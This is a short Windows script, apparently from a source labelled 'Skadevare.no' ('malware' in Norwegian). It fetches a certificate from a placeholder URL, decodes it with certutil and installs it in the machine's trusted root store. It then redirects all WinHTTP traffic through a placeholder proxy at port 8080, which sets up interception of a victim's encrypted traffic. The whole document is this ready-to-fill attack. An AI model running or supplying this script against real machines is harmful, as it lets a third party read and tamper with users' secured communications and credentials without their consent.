# ---------------------------------------------------------
#
# Skadevare.no
# A simple CA installer to trusted roots and proxy changer
#  
# ---------------------------------------------------------
wget https://path.to.your-ca-cert/cert.b64 -o cert.b64
certutil -decode ".\cert.b64" ".\cert.cer"
Import-Certificate -FilePath ".\cert.cer" -CertStoreLocation Cert:\LocalMachine\Root
netsh winhttp set proxy x.x.x.x:8080


